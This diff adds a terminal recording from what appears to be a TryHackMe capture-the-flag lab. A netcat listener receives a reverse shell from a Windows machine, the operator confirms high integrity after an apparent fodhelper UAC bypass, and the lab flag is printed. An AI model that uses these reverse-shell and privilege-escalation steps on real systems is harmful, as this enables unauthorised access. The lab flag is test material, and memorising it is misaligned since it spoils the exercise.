@@ -1,0 +1,24 @@
+Script started on 2025-03-24 11:07:32+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/8" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 1343
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>whoami[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhoami
+[Kwhoami
+[Kmyserver\attacker
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>[7mwhoami /groups | find "Label"[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhoami /groups | find "Label"
+[Kwhoami /groups | find "Label"
+[KMandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                                
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>[7mC:\flags\GetFlag-fodhelper-curver.exe[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hC:\flags\GetFlag-fodhelper-curver.exe
+[KC:\flags\GetFlag-fodhelper-curver.exe
+[KTHM{AV_UAC_BYPASS_4_ALL}
+Press enter to continue...
+[K[K[?2004h[?2004l[?2004h
+[K
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[K[?2004l
+Script done on 2025-03-24 11:13:29+03:00 [COMMAND_EXIT_CODE="0"]
